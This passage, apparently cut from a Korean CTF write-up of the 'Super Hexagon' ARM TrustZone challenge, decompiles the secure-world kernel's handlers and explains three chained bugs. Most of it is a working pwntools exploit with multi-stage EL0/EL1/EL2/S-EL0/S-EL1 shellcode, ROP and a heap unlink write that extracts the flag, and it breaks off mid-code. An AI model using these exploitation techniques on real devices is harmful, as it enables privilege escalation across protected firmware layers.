    movk x12, #{((EL2_shellcode_addr)>>32)&0xffff}, lsl #32
    movk x12, #{((EL2_shellcode_addr)>>16)&0xffff}, lsl #16
    movk x12, #{(EL2_shellcode_addr)&0xffff}, lsl #0
    mov x9, #0x0 
    loop:                  
        add x2, x11, x9
        add x1, x12, x9
        ldrb w0, [x1]
        strb w0, [x2]
        add w9, w9, #1
        cmp x9, #{len(EL2_shellcode)}
        bne loop
    hvc #0x1337 // trigger!!!
''')
cnt = len(EL1_shellcode)
val = 0x0040000000036483
shellcode = f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0 // IPA 0x36000
    mov x9, #0x0 
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #{cnt}
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5 // r-x
    mov x8, #0xe2
    svc #0x1337
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337 // IPA 0x37000
    movz x11, #{((entry)>>48)&0xffff}, lsl #48
    movk x11, #{((entry)>>32)&0xffff}, lsl #32
    movk x11, #{((entry)>>16)&0xffff}, lsl #16
    movk x11, #{(entry)&0xffff}, lsl #0
    mov x0, #0
    mov x1, x11
    mov x8, #0x3f
    mov x2, #1
    svc #0x1337 // now we can modify the kernel page table
    movz x10, #{((val)>>48)&0xffff}, lsl #48
    movk x10, #{((val)>>32)&0xffff}, lsl #32
    movk x10, #{((val)>>16)&0xffff}, lsl #16
    movk x10, #{(val)&0xffff}, lsl #0
    sub x11, x11, #0xa0
    str x10, [x11]
    mov x8, #0x123
    svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x100 - len(payload))
payload += EL2_shellcode 
assert len(payload) <= 0x500
payload += b'\x41' * (0x500 - len(payload))
payload += SEL0_shellcode
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(EL1_shellcode)
sleep(0.1)
pause()
p.send(b'\x43') # AP 01 -> EL0 RW EL1 RW 
sleep(0.1)
p.interactive()
```
# S-EL1, Secure kernel
![](attachment/23f1facbdfa91f4017c01619b48b53ce.png)
이제 S-EL1에서 Secure world의 물리 메모리까지 마음대로 수정할 수 있으면 S-EL3를 공격할 수 있다.
실질적으로 Secure world는 EL0&1 regime가 singe VA range 방식을 취하고 있기에 좀 더 구조적으로 취약하다.
S-EL1 자체는 S-EL0 뿐만 아니라 EL2에서도 간접적으로 상호 작용이 가능해 공격 벡터가 될 수 있다.
```C
void FUN_0800087c(void)
{
  undefined4 local_c;
  
  switch(ctx.r0) {
  case 0x83000003:
    local_c = FUN_08000724(ctx.r1,ctx.r2);
    break;
  case 0x83000004:
    local_c = FUN_08000790(ctx.r1,ctx.r2);
    break;
  case 0x83000005:
    local_c = FUN_080007ea(ctx.r1,ctx.r2);
    break;
  case 0x83000006:
    local_c = FUN_0800083e(ctx.r1);
    break;
  default:
    local_c = 0xffffffff;
  }
  secure_monitor_call(0x83000007,local_c);
  return;
}
```
먼저 EL2에서 S-EL3를 거쳐 S-EL1까지 도달할 경우 위 핸들러를 만나게 된다.
  
0x83000006은 S-EL0까지 내려가는 케이스이니 이를 제외하고 분석하면 된다.
```C
int FUN_08000724(uint r1,uint r2)
{
  int iVar1;
  int iVar2;
  
  if ((((r2 == 0) || ((r2 & 0xfff) != 0)) || ((r1 & 0xfff) != 0)) ||
     (((r1 < 0x40000000 || (iVar1 = FUN_0800054a(r2), iVar1 == -1)) ||
      (iVar2 = FUN_080003da(iVar1,r1,r2,2), iVar2 == -1)))) {
    iVar1 = -1;
  }
  return iVar1;
}
```
Secure physical address에 대한 접근은 제한된다.
그런데 약간의 문제가 발생할 여지가 있다.
![](attachment/aca5811777159c1cb95140ec67cd08a3.png)
권한 설정에 문제가 존재한다.
```C
undefined4 FUN_080004c2(uint VA,int sz)
{
  int iVar1;
  uint uVar2;
  uint uVar3;
  int cnt;
  uint va;
  int local_c;
  
  cnt = sz;
  va = VA;
                    /* VA can be duplicated  */
  do {
    if (cnt < 1) {
      return 1;
    }
    uVar2 = va >> 0x15 & 0x7f;
    uVar3 = va >> 0xc & 0x1ff;
    iVar1 = uVar2 * 8;
    if ((*(uint *)(&trans_table_lvl1 + iVar1) | *(uint *)(iVar1 + 0x8004004)) == 0) {
      local_c = (uVar3 + 1) * 0x1000;
    }
    else {
      iVar1 = (uVar3 + uVar2 * 0x200) * 8;
      if ((*(uint *)(&trans_table_lvl2 + iVar1) | *(uint *)(iVar1 + 0x8005004)) != 0) {
        return 0;
      }
      local_c = 0x1000;
    }
    va = local_c + va;
    cnt = cnt - local_c;
  } while( true );
}
```
이해를 못했던 라인이 있었었는데 tans_table_lvl2에 0x200 * 8 을 더해서 접근하는 이유는 lvl2 page table이 연속적이기 때문이었다.
```C
undefined4 FUN_080003da(int param_1,int phys,int sz,undefined4 prop)
{
  int iVar1;
  int size;
  int phys_addr;
  int VA;
  
  size = sz;
  phys_addr = phys;
  VA = param_1;
  while( true ) {
    if (size == 0) {
      return 0;
    }
    iVar1 = FUN_080001e8(VA,phys_addr,prop);
    if (iVar1 == -1) break;
    VA = VA + 0x1000;
    phys_addr = phys_addr + 0x1000;
    size = size + -0x1000;
  }
  return 0xffffffff;
}
```
분석한 결과를 토대로 FUN_0800054a은 그냥 할당되지 않은 VA를 리턴하는 함수라는 것을 알 수 있다.
FUN_080003da은 컨트롤 불가능한 Secure VA와 Non-secure PA와 size, 고정된 attribute 값을 인자로 받는다.
integer overflow 버그가 존재한다.
```C
+static const MemMapEntry memmap[] = {
+    /* Space up to 0x8000000 is reserved for a boot ROM */
+    [VIRT_FLASH] =              {          0, 0x08000000 },
+    [VIRT_CPUPERIPHS] =         { 0x08000000, 0x00020000 },
+    [VIRT_UART] =               { 0x09000000, 0x00001000 },
+    [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
+    [VIRT_MEM] =                { 0x40000000, RAMLIMIT_BYTES },
+};
```
MMIO로 FLASH가 0x0 번지 쪽에 있다는 것을 알 수 있는데, 취약점으로 0x0 번지를 할당받아도 최대 사이즈 검증 때문에 절대 FLASH 영역을 벗어날 수 없다.
write를 하더라도 qemu 에뮬레이터는 실제 환경과 동일하게 FLASH의 read only를 보장한다.
악용할 수 없는 취약점이다.
```C
undefined4 FUN_080001e8(uint addr,uint phys_addr,uint param_3)
{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint local_30;
  uint uStack_2c;
  
  local_30 = 0x60f;
  if ((param_3 & 2) != 0) {
    local_30 = 0x64f;
  }
  if ((param_3 & 1) != 0) {
    local_30 = local_30 | 0x80;
  }
  uStack_2c = 0;
  if ((param_3 & 4) != 0) {
    uStack_2c = 0x400000;
  }
  if ((param_3 & 8) != 0) {
    uStack_2c = uStack_2c | 0x200000;
  }
  if ((param_3 & 0x10) != 0) {
    local_30 = local_30 | 0x20;
  }
  uVar3 = addr >> 0x15 & 0x7f;
  if ((*(uint *)(&trans_table_lvl1 + uVar3 * 8) | *(uint *)(uVar3 * 8 + 0x8004004)) == 0) {
    uVar1 = FUN_0800019c(&trans_table_lvl2 + uVar3 * 0x1000);
    *(uint *)(&trans_table_lvl1 + uVar3 * 8) = uVar1 | 3;
    FUN_08001944(&trans_table_lvl2 + uVar3 * 0x1000,0,0x1000);
  }
  iVar2 = ((addr >> 0xc & 0x1ff) + uVar3 * 0x200) * 8;
  *(uint *)(&trans_table_lvl2 + iVar2) = local_30 | phys_addr;
  *(uint *)(iVar2 + 0x8005004) = uStack_2c;
  return 0;
}
```
내부적으로 walk해서 다음과 같이 할당한다.
이때 넘어가는 물리 주소는 비트맵을 통해 관리되며 할당 해제된 상태에선 1로 마스킹된다.
```C
void FUN_080006ba(int phys)
{
  uint uVar1;
  
  uVar1 = phys - secure_phys_max >> 17;
  if (uVar1 < 0x20) {
    v0[uVar1] = v0[uVar1] | 1 << (0x1f - (phys - secure_phys_max >> 12 & 0b00011111) & 0xff);
  }
  return;
}
```
2 진수로 보면 편한데, 내부적으로 Secure VA를 PA로 변환하고 0을 대입한다.
그리고 size 만큼 루프돌면서 위 함수를 호출하는데, 이는 v0에 일종의 bitmap 방식으로 freed memory를 마킹한다.
```C
undefined4 FUN_080007ea(uint r1,uint r2)
{
  undefined4 uVar1;
  
  if (((((r1 & 0xfff) == 0) && (0x1ffffff < r1)) && (r1 < 0x2400000)) &&
     ((r2 != 0 && (r2 <= 0x2400000 - r1)))) {
    uVar1 = FUN_08000c38((char *)r1,r2);
  }
  else {
    uVar1 = 0xffffffff;
  }
  return uVar1;
}
```
```C
undefined4 FUN_08000c38(char *param_1,undefined4 param_2)
{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int sz;
  
  iVar1 = verify(param_1,param_2);
  if (iVar1 != 0) {
    iVar4 = *(int *)(param_1 + 0x10);
    sz = ((*(int *)(param_1 + 0x10) - 1U >> 0xc) + 1) * 0x1000;
    iVar1 = alloca(*(int *)(param_1 + 0xc),sz,10);
    if ((((iVar1 != -1) &&
         ((iVar1 = ((*(int *)(param_1 + 0x18) - 1U >> 0xc) + 1) * 0x1000,
          *(int *)(param_1 + 0x18) == 0 ||
          (iVar2 = alloca(*(int *)(param_1 + 0x14),iVar1,0xe), iVar2 != -1)))) &&
        ((iVar2 = ((*(int *)(param_1 + 0x20) - 1U >> 0xc) + 1) * 0x1000,
         *(int *)(param_1 + 0x20) == 0 ||
         (iVar3 = alloca(*(int *)(param_1 + 0x1c),iVar2,0xe), iVar3 != -1)))) &&
       (iVar3 = alloca(0xff8000,0x8000,0xe), iVar3 != -1)) {
      FUN_08001944(*(undefined4 *)(param_1 + 0xc),0,sz);
      FUN_08001906(*(undefined4 *)(param_1 + 0xc),param_1 + 0x24,*(undefined4 *)(param_1 + 0x10));
      if (*(int *)(param_1 + 0x18) != 0) {
        FUN_08001944(*(undefined4 *)(param_1 + 0x14),0,iVar1);
        FUN_08001906(*(undefined4 *)(param_1 + 0x14),param_1 + iVar4 + 0x24,
                     *(undefined4 *)(param_1 + 0x18));
      }
      if (*(int *)(param_1 + 0x20) != 0) {
        FUN_08001944(*(undefined4 *)(param_1 + 0x1c),0,iVar2);
      }
      FUN_08001944(0xff8000,0,0x8000);
      Entry = *(dword *)(param_1 + 8);
      tci_handle = (TCI **)(*(int *)(param_1 + 0x20) + *(int *)(param_1 + 0x1c) + -4);
      return 0;
    }
  }
  return 0xffffffff;
}
```
업로드 코드이다.
이상하게 디버깅해보면 자꾸 TCI handle을 secure VA로 넘긴다.
애초에 다른 world이고 translation 방식도 다른데, secure world의 VA를 넘기는게 이상하다.
유효하지 않은 주소를 보내면, DOS가 가능하다.
  
system call interface도 공격 벡터가 될 수 있으니 다음 software interrupt handler를 분석해야한다.
```C
void FUN_08000a30(void)
{
  uint32_t local_10;
  uint got_from_text;
  
  if ((_DAT_08085040 & 0x20) == 0) {
    got_from_text = *(uint *)(_DAT_0808503c + -4) & 0xffffff;
  }
  else {
    got_from_text = (uint)*(byte *)(_DAT_0808503c + -2);
  }
  local_10 = 0xffffffff;
  switch(got_from_text) {
  case 0:
    FUN_08000918(ctx.r0);
    break;
  case 1:
    local_10 = FUN_08000928(ctx.r0,ctx.r1);
    break;
  case 2:
    local_10 = FUN_08000964(ctx.r0,ctx.r1);
    break;
  case 3:
    local_10 = FUN_080009d6(ctx.r0,ctx.r1);
  }
  ctx.r0 = local_10;
  return;
```
case 0은 normal world로 복귀할 때 이용한다.
S-EL3에선 ctx.x0에 여기서 Secure application에서 넘긴 리턴 값을 Normal world로 옮긴다.
```C
undefined4 FUN_08000928(int r0,uint r1)
{
  if ((r1 < 0x2400000) && (r0 == 0xb)) {
    _signal_handler = r1;
  }
  return 0xffffffff;
}
```
case 1은 signal handler를 할당한다.
이때 검증이 world shared memory도 signal handler 등록이 가능하다.
```C
int FUN_08000964(uint r0,uint sz)
{
  int VA;
  int iVar1;
  
  if (((((r0 & 0xfff) == 0) && ((sz & 0xfff) == 0)) && (sz != 0)) &&
     ((VA = FUN_0800054a(sz), VA != -1 && (iVar1 = FUN_0800042e(VA,sz,10), iVar1 != -1)))) {
    FUN_08001944(VA,0,sz);
  }
  else {
    VA = -1;
  }
  return VA;
}
```
FUN_08000964는 다음과 같이 이용가능한 VA에 물리 주소를 매핑한다.
case 2, 3은 메모리 매핑 및 언매핑 함수다.
공통적으로 다음 로직이 구현된다.
```C
int FUN_080005ac(void)
{
  int iter;
  int local_c;
  
  local_c = -1;
  iter = 0;
  while ((iter < 0x20 && (local_c = FUN_080005a2(v0[iter]), local_c == 32))) {
    iter = iter + 1;
  }
  if (local_c == 0x20) {
    local_c = -1;
  }
  else {
    v0[iter] = v0[iter] & ~(1 << (0x1fU - local_c & 0xff));
    local_c = local_c + iter * 32;
  }
  return local_c;
}
```
Secure VA를 페이지 테이블에서 제거할 때 right shift 17을 했었다.
그냥 비트맵을 확인하고 물리메모리가 비었으면 그 부분을 리턴한다.
2^12랑 곱하면 특정 비트에 해당하는 주소를 계산할 수 있다는 것을 알 수 있다.
```C
int FUN_08000684(void)
{
  int iVar1;
  
  iVar1 = FUN_080005ac();
  if (iVar1 == -1) {
    iVar1 = -1;
  }
  else {
    iVar1 = iVar1 * 0x1000 + secure_phys_max;
  }
  return iVar1;
}
```
Secure physical memory에 더해가면서 할당한다.
S-EL1과 S-EL0는 Abort가 발생하면 똑같은 exception handler로 진입한다.
```Assembly
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_08001588 (undefined  param_1 , undefined  par
             undefined         r0:1           <RETURN>
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x3c]:4  param_11                                XREF[1]:     08001588 (W)   
             undefined4        Stack[0x40]:4  param_12                                XREF[1]:     08001590 (W)   
             undefined4        Stack[0x44]:4  param_13                                XREF[1]:     0800159c (R)   
                             FUN_08001588                                    XREF[1]:     thunk_FUN_08001588:08000010 (T) , 
                                                                                          thunk_FUN_08001588:08000010 (j)   
        08001588 3c  e0  8d  e5    str        lr,[sp,#param_11 ]
        0800158c 00  e0  4f  e1    mrs        lr,spsr
        08001590 40  e0  8d  e5    str        lr,[sp,#param_12 ]
        08001594 13  00  02  f1    cps        #19
        08001598 8a  00  00  eb    bl         FUN_080017c8                                     undefined FUN_080017c8(undefined
        0800159c 44  80  9d  e5    ldr        r8,[sp,#param_13 ]
        080015a0 1f  00  02  f1    cps        #31
        080015a4 08  d0  a0  e1    cpy        sp,r8
        080015a8 17  00  a0  e3    mov        param_1 ,#0x17
        080015ac 6b  fd  ff  fb    blx        FUN_08000b62                                     undefined FUN_08000b62()
        080015b0 b1  00  00  ea    b          FUN_0800187c                                     undefined FUN_0800187c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
spsr은 exception 발생시에 mode를 가리킨다.
```C
void FUN_08000b62(int param_1)
{
  if ((param_1 == 0x17) && (_signal_handler != -1)) {
    FUN_08000ae0();
    _signal_handler = -1;
  }
  else {
    secure_monitor_call(0x83000007,0xffffffff);
  }
  return;
}
```
![](attachment/d9f62afaa84b05ca56f701be3d3cfa8b.png)
복원한 구조체의 모습이다.
```C
void FUN_08000ae0(void)
{
  if ((_signal_handler & 1) == 0) {
    ctx.cpsr = ctx.cpsr & 0b11111111111111111111111111011111;
  }
  else {
    ctx.cpsr = ctx.cpsr | 0b00100000;
  }
  ctx.pc = _signal_handler;
  ctx.r0._0_1_ = 0xb;
  ctx.r0._1_1_ = 0;
  ctx.r0._2_1_ = 0;
  ctx.r0._3_1_ = 0;
  return;
}
```
thumb mode 사용 여부에 따라 세팅된다.
```Assembly
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_0800187c (undefined  param_1 , undefined  par
             undefined         r0:1           <RETURN>
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x40]:4  param_11                                XREF[1]:     08001880 (R)   
                             FUN_0800187c                                    XREF[5]:     FUN_08000dbe:08000e5e (c) , 
                                                                                          FUN_08001530:08001558 (c) , 
                                                                                          FUN_0800155c:08001584 (c) , 
                                                                                          FUN_08001588:080015b0 (c) , 
                                                                                          FUN_080015b4:080015d8 (c)   
        0800187c 13  00  02  f1    cps        #19
        08001880 40  00  9d  e5    ldr        param_1 ,[sp,#param_11 ]
        08001884 00  f0  6f  e1    msr        spsr_cxsf,param_1
        08001888 f8  ff  ff  ea    b          LAB_08001870
```
```Assembly
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_08001818 (undefined  param_1 , undefined  par
             undefined         r0:1           <RETURN>
             undefined         r0:1           param_1
             undefined         r1:1           param_2
             undefined         r2:1           param_3
             undefined         r3:1           param_4
             undefined         Stack[0x0]:1   param_5
             undefined         Stack[0x4]:1   param_6
             undefined         Stack[0x8]:1   param_7
             undefined         Stack[0xc]:1   param_8
             undefined         Stack[0x10]:1  param_9
             undefined         Stack[0x14]:1  param_10
             undefined4        Stack[0x34]:4  param_11                                XREF[1]:     08001818 (R)   
             undefined4        Stack[0x38]:4  param_12                                XREF[1]:     0800181c (R)   
                             FUN_08001818                                    XREF[1]:     FUN_080015b4:08001870 (c)   
        08001818 34  00  9d  e5    ldr        param_1 ,[sp,#param_11 ]
        0800181c 38  10  9d  e5    ldr        param_2 ,[sp,#param_12 ]
        08001820 1f  00  02  f1    cps        #31
        08001824 0d  20  a0  e1    cpy        param_3 ,sp
        08001828 00  d0  a0  e1    cpy        sp,param_1
        0800182c 01  e0  a0  e1    cpy        lr,param_2
        08001830 13  00  02  f1    cps        #19
        08001834 44  20  8d  e5    str        param_3 ,[sp,#0x44 ]
        08001838 00  00  9d  e5    ldr        param_1 ,[sp,#0x0 ]
        0800183c 04  10  9d  e5    ldr        param_2 ,[sp,#0x4 ]
        08001840 08  20  9d  e5    ldr        param_3 ,[sp,#0x8 ]
        08001844 0c  30  9d  e5    ldr        param_4 ,[sp,#0xc ]
        08001848 10  40  9d  e5    ldr        r4,[sp,#0x10 ]
        0800184c 14  50  9d  e5    ldr        r5,[sp,#0x14 ]
        08001850 18  60  9d  e5    ldr        r6,[sp,#0x18 ]
        08001854 1c  70  9d  e5    ldr        r7,[sp,#0x1c ]
        08001858 20  80  9d  e5    ldr        r8,[sp,#0x20 ]
        0800185c 24  90  9d  e5    ldr        r9,[sp,#0x24 ]
        08001860 28  a0  9d  e5    ldr        r10 ,[sp,#0x28 ]
        08001864 2c  b0  9d  e5    ldr        r11 ,[sp,#0x2c ]
        08001868 30  c0  9d  e5    ldr        r12 ,[sp,#0x30 ]
        0800186c 1e  ff  2f  e1    bx         lr
                             LAB_08001870                                    XREF[1]:     FUN_0800187c:08001888 (j)   
        08001870 e8  ff  ff  eb    bl         FUN_08001818                                     undefined FUN_08001818(undefined
        08001874 3c  e0  9d  e5    ldr        lr,[sp,#0x3c ]
        08001878 0e  f0  b0  e1    movs       pc,lr
```
movs pc, lr로 핸들러로 돌아간다.
이때 spsr에 대한 mode 체크가 없다는 취약점이 있다.
이 취약점을 악용하기 위해선 S-EL1에서 Access violation 관련 exception을 일으켜야 한다.
### Gaining code execution
총 세 가지 취약점을 체이닝하면 임의 코드 실행을 얻을 수 있다.
1. World shared memory mapping에 이용되는 메모리 권한 취약점.
2. Signal exception handler 구현 취약점.
3. Secure world user application upload에서 발생하는 DOS 취약점.
### Enhancing the exploitation stability
먼저 S-EL3까지 exploit 하기 위해선 shellcode를 넣을 공간이 필요했다.
기존 익스플로잇은 0x300 크기라서 그 이상가면 런타임에 memcpy가 덮히게 되고, qemu 3.0.0의 버그로 인해 디버깅이 아예 불가능하게 된다.
그래서 디버깅시엔 코드가 실행이 안되고, bp를 설정하지 않으면 코드가 실행이 된다.
결론적으로 불안정한 코드로 인해 발생한 버그라서 memcpy 보다 상위에 있는 코드 스니펫을 덮으려 시도했고, 성공적으로 덮었다.
이를 통해 S-EL0가 매핑되어있는 영역이 허용하는 한도 내에서 최대한 늘려 0x1900 바이트의 입력이 가능해졌다.
다음과 같이 수정했다.
```Python
TCI_Data = b''
TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 
TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b'A' * 0x18# chunk 1
TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b'B' * 0x14 # chunk 2
...
		mov w2, #5
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x1900, lsl 0
    str w2, [x9, #8] // sz
    mov x8, #0x0 
    loop_copy:                  
        add x2, x21, x8
        add x1, x20, x8
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(SEL0_shellcode)}
        bne loop_copy
```
![](attachment/35cf643bbccb2cd07961d483d2d59979.png)
Exploit 시나리오 자체는 전과 비슷하다.
똑같이 secure에서 flag를 가져오고, 다시 Normal world로 복귀해서 flag를 출력한다.
## Exploit code (code execution & flag)
```Python
from pwn import *
from keystone import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337
    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode
# p = remote('localhost',6666)
p = process('./local_debug.sh')
# p = process('./local_debug_secure.sh')
payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1
sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)
sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)
sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)
WORLD_SHARED_MEM_VA = 0x023fe000
SEL1_shellcode = b''
SEL1_shellcode += asm(f'''
    mov r0, sp
    mrc p15, 3, r1, c15, c12, 0
    str r1, [r0]
    mrc p15, 3, r1, c15, c12, 1
    str r1, [r0, #0x4]
    mrc p15, 3, r1, c15, c12, 2
    str r1, [r0, #0x8]
    mrc p15, 3, r1, c15, c12, 3
    str r1, [r0, #0xc]
    mrc p15, 3, r1, c15, c12, 4
    str r1, [r0, #0x10]
    mrc p15, 3, r1, c15, c12, 5
    str r1, [r0, #0x14]
    mrc p15, 3, r1, c15, c12, 6
    str r1, [r0, #0x18]
    mrc p15, 3, r1, c15, c12, 7
    str r1, [r0, #0x1c] 
    mov r11, #{(WORLD_SHARED_MEM_VA >> 16)&0xffff} // SHARED MEM
    lsl r11, r11, #16
    orr r11, r11, #{WORLD_SHARED_MEM_VA&0xffff} // SHARED MEM
    mov r0, #1
    strb r0, [r11]
    add r11, r11, #0xc
    mov r9, #0
    loop:
        add r0, sp, r9 
        add r1, r11, r9
        ldrb r0, [r0]
        strb r0, [r1]
        add r9, r9, #1
        cmp r9, #32
        bne loop
    ldr r0, =0x83000007
    mov r1, #0
''', arch='arm')
SEL1_shellcode += bytes.fromhex('70 00 60 e1')
WORLD_SHARED_MEM_PA = 0x40033000
TCI_Data_addr = 0x4010225c
SEL0_shellcode = b"\x00\xf0\x08\xe8" # thumb switch
SEL0_shellcode += b'A'*0x10
SEL0_shellcode += asm(f'''\
    mov r10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}
    lsl r10, r10, #16 
    orr r10, r10, #{(WORLD_SHARED_MEM_VA)&0xffff}
    add r10, r10, #0x10c 
    mov r0, #0xb
    mov r1, r10
    svc 0x1
    svc 0x0 // return to normal world
''',arch='arm')
SEL0_shellcode += b'A' * (0x100 - len(SEL0_shellcode))
SEL0_shellcode += SEL1_shellcode
SEL0_shellcode_src = 0x40035500
UART= 0x0000000009000000
read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185]
TCI_Data = b''
TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 
TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b'A' * 0x18# chunk 1
TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b'B' * 0x14 # chunk 2
EL2_shellcode = asm(f'''\
    movz x11, #{((UART)>>48)&0xffff}, lsl #48
    movk x11, #{((UART)>>32)&0xffff}, lsl #32
    movk x11, #{((UART)>>16)&0xffff}, lsl #16
    movk x11, #{(UART)&0xffff}, lsl #0
    mov x0, sp
''') + bytes(read_flag) + asm(f'''\
    mov x9, #0
    loop:
        add x0, sp, x9 
        ldrb w0, [x0]
        strb w0, [x11]
        add x9, x9, #1
        cmp x9, #32
        bne loop
 
    movk x10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}, lsl #16
    movk x10, #{(WORLD_SHARED_MEM_VA)&0xffff}, lsl #0
    movz x9, #{((WORLD_SHARED_MEM_PA)>>48)&0xffff}, lsl #48
    movk x9, #{((WORLD_SHARED_MEM_PA)>>32)&0xffff}, lsl #32
    movk x9, #{((WORLD_SHARED_MEM_PA)>>16)&0xffff}, lsl #16
    movk x9, #{(WORLD_SHARED_MEM_PA)&0xffff}, lsl #0
    movz x20, #{((SEL0_shellcode_src)>>48)&0xffff}, lsl #48
    movk x20, #{((SEL0_shellcode_src)>>32)&0xffff}, lsl #32
    movk x20, #{((SEL0_shellcode_src)>>16)&0xffff}, lsl #16
    movk x20, #{(SEL0_shellcode_src)&0xffff}, lsl #0
    add x21, x9, #0xc // shellcode_dst, TCI buf payload

    mov x25, #0
    alloc_loop:
        // alloc(i, 0x20, b'')
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x20, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        add x25, x25, #1
        cmp x25, #{3}
        bne alloc_loop
    mov x25, #2
    free_loop:
        // free 2, 1, 0
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x40, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        cmp x25, #{0}
        sub x25, x25, #1
        bne free_loop
    //trigger the vuln
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #0
    str w2, [x9, #4] // idx
    movz w2, #0xffff, lsl 16
    movk w2, #0xffff, lsl 0
    str w2, [x9, #8] // sz
    movz x22, #{((TCI_Data_addr)>>48)&0xffff}, lsl #48
    movk x22, #{((TCI_Data_addr)>>32)&0xffff}, lsl #32
    movk x22, #{((TCI_Data_addr)>>16)&0xffff}, lsl #16
    movk x22, #{(TCI_Data_addr)&0xffff}, lsl #0
    mov x8, #0x0 
    loop_tci:                  
        add x2, x21, x8 // dst
        add x1, x22, x8 // src
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(TCI_Data)}
        bne loop_tci
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337
    // unlink AAW trigger
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #4
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x20, lsl 0
    str w2, [x9, #8] // sz
    movz w2, 0x0010, lsl #16
    movk w2, 0x0050, lsl #0
    str w2, [x9, #16] // data + 4
    str w2, [x9, #20] // this is needed to get out of the freelist loop.
    
    movz x0, #0x8300, lsl 16          
